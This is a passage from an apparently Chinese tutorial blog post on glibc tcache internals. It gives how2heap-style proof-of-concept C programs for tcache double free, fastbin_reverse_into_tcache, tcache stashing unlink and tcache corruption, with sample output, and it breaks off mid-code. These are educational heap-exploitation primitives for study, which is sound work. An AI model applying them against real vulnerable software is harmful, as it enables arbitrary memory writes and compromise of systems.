<li>通过 <code>unsorted bin</code> 时，如果大小不匹配，<code>chunk</code> 会被放入对应的 <code>bins</code>，若达到 <code>tcache_unsorted_limit</code> 限制之前已经存入 <code>chunk</code> 就此被取出（默认限制）。</li>
</ol>
<p>在内存分配的 <code>malloc</code> 函数中，会将内存块移入 <code>tcache</code> 中。</p>
<h5 id="tcache-的功能"><a href="#tcache-的功能" class="headerlink" title="tcache 的功能"></a>tcache 的功能</h5><ol>
<li>首先，申请的内存块符合 <code>fastbin</code> 大小并且在 <code>fastbin</code> 内找到可用的空闲块时，会把 <code>fastbin</code> 链表的其他内存块放入 <code>tcache</code> 中。</li>
<li>其次，申请的内存块符合 <code>smallbin</code> 大小并且在 <code>smallbin</code> 内找到可用的空闲块时，会把 <code>smallbin</code> 链上的其他内存块放入 <code>tcache</code> 中。</li>
<li>第三，针对 <code>unsorted bin</code> 链上有合适的链块时，并不直接返回，而是先放到 <code>tcache</code> 中，继续处理。上面的情况将 <code>chunk</code> 放入 <code>tcache</code> 中，在将合适的 <code>chunk</code> 返回时利用。</li>
</ol>
<p>在 <code>tcache_get</code> 中，<strong>仅仅检查了 <code>tck_idx</code></strong>，前面说过，可以将 <code>tcache</code> 当作一个类似于 <code>fastbin</code> 的单独链表，只是它的 <code>check</code> 并没有复用，因此我们可以利用这一点来进行 <code>attack</code>。</p>
<p> <strong>tcache 遵循“后进先出”，从头部插入，尾部取出</strong></p>
<h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>通过下面这段程序再来理解一下tcache，环境：ubuntu 18.04</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o struct struct.c -g</span></span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<ul>
<li>运行到 malloc(0) 直接一直 si 中间的call注意一下 n 跳过。</li>
<li>一直到如下所示 si 进入</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x7ffff7a78b66 &lt;malloc_hook_ini+374&gt;    call   tcache_init.part                &lt;tcache_init.part&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>在一直si到</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x7ffff7a78460 &lt;tcache_init.part+80&gt;     call   _int_malloc                &lt;_int_malloc&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>用 n 到下一步，再用 heap 就可以看到系统分配了 heap 和这个 tcache_perthread_struct 的 chunk。</li>
</ul>
<img data-src="../images/image-20250320221542108.png" alt="image-20250320221542108" style="zoom: 50%;" />

<h3 id="glibc-tcache变化"><a href="#glibc-tcache变化" class="headerlink" title="glibc_tcache变化"></a>glibc_tcache变化</h3><ul>
<li>glibc2.26中引入tcache</li>
<li>glibc2.27中正式应用了tcache</li>
<li>glibc2.29中加入了检查tcache的double_free的机制，tcache_get()中加入了key变量</li>
</ul>
<h2 id="攻击原理demo"><a href="#攻击原理demo" class="headerlink" title="攻击原理demo"></a>攻击原理demo</h2><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h3><p>本demo是一个简单的利用tcache的double-free attack</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>我们知道在Fastbin attack的时候我们是不能依次free两次同一块chunk的，但是tcache可以</p>
<p>这是为什么呢？原因也很简单，从tcache_put函数可以看出，它几乎没有设置任何检查，也就意味着我们无需做任何事就可以对同一个chunk进行多次的free，相比fastbin_dup来说，tcache_dup的利用更加的简单了</p>
<p>然后我们再malloc两次就可以得到同一块内存的chunk</p>
<p>对本程序而言，程序先malloc了一个chunk a(size&#x3D;8)</p>
<p>然后连续Free两次chunk a,此时在free list中就会链入两次chunk a</p>
<p>这个时候我们再申请两次chunk就可以将两次的chunk a全部拿出来了</p>
<h3 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h3><p>条件：堆溢出 或 UAF</p>
<p>效果：任意地址分配改写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>; <span class="comment">// 定义分配大小为64字节</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;本攻击效果类似于unsorted_bin_attack，但适用于小内存分配（allocsize &lt;= 0x78）。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;目标是构造特定条件使得调用malloc(allocsize)时会将一个超大无符号值写入栈。\n\n&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配14个指针用于后续释放</span></span><br><span class="line">    <span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">    <span class="type">size_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;首先我们需要至少free释放7次来填满tcache。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;（超过7次也可以正常工作）\n\n&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 填满tcache</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;接下来要释放的指针是我们要篡改的chunk：%p\n&quot;</span></span><br><span class="line">        <span class="string">&quot;现在或稍后篡改都可以。因为tcache已满，它会被放入fastbin。\n\n&quot;</span>,</span><br><span class="line">        victim</span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;接下来需要再释放1到6个指针。这些也会进入fastbin。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;如果我们要覆盖的栈地址值不是零，则需要精确释放6次，否则会导致段错误。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;但如果栈上的值是零，则只需要释放1次。\n\n&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 填满fastbin</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在栈上创建数组并填充垃圾数据</span></span><br><span class="line">    <span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var)); <span class="comment">// 填充数据为0xcd</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;我们想要攻击的栈地址：%p\n&quot;</span></span><br><span class="line">        <span class="string">&quot;当前值为：%p\n&quot;</span>,</span><br><span class="line">        &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">        (<span class="type">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;现在我们利用缓冲区溢出或use-after-free等漏洞\n&quot;</span></span><br><span class="line">        <span class="string">&quot;来覆盖位于%p处的next指针\n\n&quot;</span>,</span><br><span class="line">        victim</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ------------漏洞利用部分-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 覆盖victim中的链表指针</span></span><br><span class="line">    *(<span class="type">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;下一步通过7次malloc(allocsize)清空tcache\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空tcache</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在打印栈数组内容以展示尚未被修改的状态：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;下一次内存分配将触发栈数据覆盖。tcache已空，但fastbin还有内容，\n&quot;</span></span><br><span class="line">        <span class="string">&quot;因此下一个分配来自fastbin。同时会用fastbin中的7个chunk重新填充tcache。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;这7个chunk会以逆序复制到tcache，因此目标栈地址最终会成为tcache中的第一个chunk。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;它包含指向链表中下一个chunk的指针，这就是为什么堆指针会被写入栈。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;先前提到如果栈上值为零，释放少于6次也可以工作，\n&quot;</span></span><br><span class="line">        <span class="string">&quot;因为栈上的值会被视为链表next指针，若非有效指针或null会导致崩溃。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;现在栈数组的内容如下：\n\n&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(allocsize); <span class="comment">// 触发栈数据覆盖</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize); <span class="comment">// 再次分配内存</span></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;最后，再次调用malloc会得到栈地址：%p\n&quot;</span>,</span><br><span class="line">        q</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    assert(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]); <span class="comment">// Assert 断言</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ubuntu20.04 , gcc -o fastbin_reverse_into_tcache fastbin_reverse_into_tcache.c  -g</p>
<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctf@d2ad36c17601:~/pwn$ ./fastbin_reverse_into_tcache</span><br><span class="line"></span><br><span class="line">本攻击效果类似于unsorted_bin_attack，但适用于小内存分配（allocsize &lt;= 0x78）。</span><br><span class="line">目标是构造特定条件使得调用malloc(allocsize)时会将一个超大无符号值写入栈。</span><br><span class="line"></span><br><span class="line">首先我们需要至少free释放7次来填满tcache。</span><br><span class="line">（超过7次也可以正常工作）</span><br><span class="line"></span><br><span class="line">接下来要释放的指针是我们要篡改的chunk：0x56131b5de4d0</span><br><span class="line">现在或稍后篡改都可以。因为tcache已满，它会被放入fastbin。</span><br><span class="line"></span><br><span class="line">接下来需要再释放1到6个指针。这些也会进入fastbin。</span><br><span class="line">如果我们要覆盖的栈地址值不是零，则需要精确释放6次，否则会导致段错误。</span><br><span class="line">但如果栈上的值是零，则只需要释放1次。</span><br><span class="line"></span><br><span class="line">我们想要攻击的栈地址：0x7ffff3b70d20</span><br><span class="line">当前值为：0xcdcdcdcdcdcdcdcd</span><br><span class="line">现在我们利用缓冲区溢出或use-after-free等漏洞</span><br><span class="line">来覆盖位于0x56131b5de4d0处的next指针</span><br><span class="line"></span><br><span class="line">下一步通过7次malloc(allocsize)清空tcache</span><br><span class="line"></span><br><span class="line">现在打印栈数组内容以展示尚未被修改的状态：</span><br><span class="line"></span><br><span class="line">0x7ffff3b70d10: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d18: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d20: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d28: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d30: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d38: 0xcdcdcdcdcdcdcdcd</span><br><span class="line"></span><br><span class="line">下一次内存分配将触发栈数据覆盖。tcache已空，但fastbin还有内容，</span><br><span class="line">因此下一个分配来自fastbin。同时会用fastbin中的7个chunk重新填充tcache。</span><br><span class="line">这7个chunk会以逆序复制到tcache，因此目标栈地址最终会成为tcache中的第一个chunk。</span><br><span class="line">它包含指向链表中下一个chunk的指针，这就是为什么堆指针会被写入栈。</span><br><span class="line"></span><br><span class="line">先前提到如果栈上值为零，释放少于6次也可以工作，</span><br><span class="line">因为栈上的值会被视为链表next指针，若非有效指针或null会导致崩溃。</span><br><span class="line"></span><br><span class="line">现在栈数组的内容如下：</span><br><span class="line"></span><br><span class="line">0x7ffff3b70d10: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d18: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d20: 0x56131b5de4d0</span><br><span class="line">0x7ffff3b70d28: 0x56131b5de010</span><br><span class="line">0x7ffff3b70d30: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d38: 0xcdcdcdcdcdcdcdcd</span><br><span class="line"></span><br><span class="line">最后，再次调用malloc会得到栈地址：0x7ffff3b70d20</span><br></pre></td></tr></table></figure>

<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>我们知道当同一个size的chunk在tcachebins中满7个时，就会填入fasbins，而当tcachebins中的chunk被申请完了，系统会将fastbins中同样size逆序放入到tcachebins</p>
<p>首先，创建了14个chunk填满了tcache_bins，fastbins</p>
<p>然后，通过 UAF 或 堆溢出 修改fastbins中第一个放入的chunk(victim)的fd指针指向栈地址(实战中可以为任意可写地址，比如got表可写的__free_hook-0x10)</p>
<p>最后，申请出7个tcachebins，再申请一个即可触发 fastbin_reverse_into_tcache，然后第一个放入fastbins的chunk(victim)就会出现在tcachebins的头部，申请出即可</p>
<h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><p>攻击成效：向任意地址写堆地址或分配任意地址</p>
<p>攻击前提：</p>
<ul>
<li>能够控制 Small Bin chunk的bk指针</li>
<li>程序可以越过Tache取chunk。（calloc可以做到）</li>
<li>程序可以分配两种不同大小且属于Unsorted Bin的chunk</li>
</ul>
<p>参考链接：<a href="https://blog.csdn.net/qq_41252520/article/details/126198171">https://blog.csdn.net/qq_41252520/article/details/126198171</a></p>
<p>how2heap ;2.31</p>
<p>主要利用的是small bin链表中摘堆块后重新排列进tcache的原理</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;本文件演示针对tcache的stashing unlink攻击。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;该PoC已在glibc-2.27、glibc-2.29和glibc-2.31测试通过。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;当你能覆盖victim-&gt;bk指针时可以使用此技术。此外，需要至少使用calloc分配一次内存。最后，我们需要一个可写地址来绕过glibc的检查。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;glibc将smallbin放入tcache的机制为我们提供了攻击机会。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;此技术允许我们向任意地址写入libc地址，并在需要处创建伪造chunk。本例将在栈上创建伪造chunk。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var模拟我们要分配到的伪造chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var模拟我们想要分配到的伪造chunk。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;首先向fake_chunk-&gt;bk写入可写地址以绕过glibc中的bck-&gt;fd = bin检查。这里选择stack_var[2]的地址作为伪造bk。稍后可以看到*(fake_chunk-&gt;bk + 0x10)即stack_var[4]将在攻击后变为libc地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;可以看到fake_chunk-&gt;bk的值为：%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;同时查看stack_var[4]的初始值：%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在分配9个malloc chunk。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配9个chunk</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将7个chunk放入tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;随后释放其中7个chunk到tcache。注意没有连续释放chunk2到chunk9，因为相邻的unsorted bin会在后续malloc时合并。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;可以看到，chunk1及[chunk3,chunk8]被放入tcache，而chunk0和chunk2将进入unsorted bin。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后一个tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// 现在放入unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换为small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在分配大于0x90的chunk使chunk0和chunk2进入small bin。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>); <span class="comment">// 大小 &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在有5个tcache bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;接着分配两个chunk腾出空间，现在有5个tcache bin和2个small bin。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在模拟可以覆盖victim-&gt;bk指针指向伪造chunk地址的漏洞：%p。\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改victim-&gt;bk</span></span><br><span class="line">    <span class="comment">/* 漏洞点 */</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/* 漏洞点 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 触发攻击</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;最后用calloc分配0x90的chunk触发攻击。之前释放的small bin将被返回，另一个chunk和伪造chunk被链接到tcache。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在伪造chunk已被放入tcache bin[0xa0]链表。其fd指针指向下一个空闲chunk：%p，且bck-&gt;fd已被修改为libc地址：%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配并获取栈上的伪造chunk</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;可以看到，下一次malloc(0x90)将返回我们伪造的chunk区域：%p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><ol>
<li>申请 9 个 chunk，然后先释放chunk3 - chunk8 和chunk1，他们会被放入 tcache bin中。然后再释放 chunk0 和 chunk2，会被放入 unsortedbin中（连着释放7个会被合并）；</li>
<li>随后申请一个 大于 上述 chunk size (0x90)的chunk，那么此时所有 的 空闲chunk都不合适，并且 unsortedbin 中的chunk0 和 chunk2 会被放入 small bin中；</li>
<li>申请两个 tcache，此时 tcache 中的 剩余 chunk数量 为 5 个；</li>
<li><strong>修改 chunk 2 的 bk指针 指向我们伪造的 内存的地址 chunk，<u>该内存地址的chunk 的 bk 指针要为一个 可写入的地址</u>；</strong></li>
<li>随后调用 calloc() 申请 与tcache 同大小的 chunk，由于 calloc() 函数会跳过 tcache，所以其会直接从 small bin中 取 chunk0；</li>
<li>此时，同上述的 fastbin_reverse_into_tcache 类似的结果，small bin 中剩余的 chunk2-&gt; fake chunk，会从后向前 加入 tcache中，而且由于此时tcache 仅剩2个空余，所以只会遍历到 fake chunk就会结束。</li>
<li>经过上述操作后，此时 tcache链中 第一个 chunk 是 fake chunk，我们取出即可。</li>
</ol>
<h3 id="tcache-corruption"><a href="#tcache-corruption" class="headerlink" title="tcache_corruption"></a>tcache_corruption</h3><p>这段代码演示了控制tcache_perthread_struct的chunk，修改next指针（目前的tcache并没有检查next指向的chunk的size是否合法，所以直接伪造next指针为想要修改的地址就好了）实现任意地址写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> global_buf[<span class="number">0x100</span>] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *ptr, *controlled_buf;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> temp;</span><br><span class="line">    tcache_perthread_struct *fake;</span><br><span class="line"><span class="comment">//申请一个 chunk 为泄露 tcache_perthread_struct 的 chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_buf: %s\n&quot;</span>, global_buf);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line">    temp = (<span class="type">long</span> <span 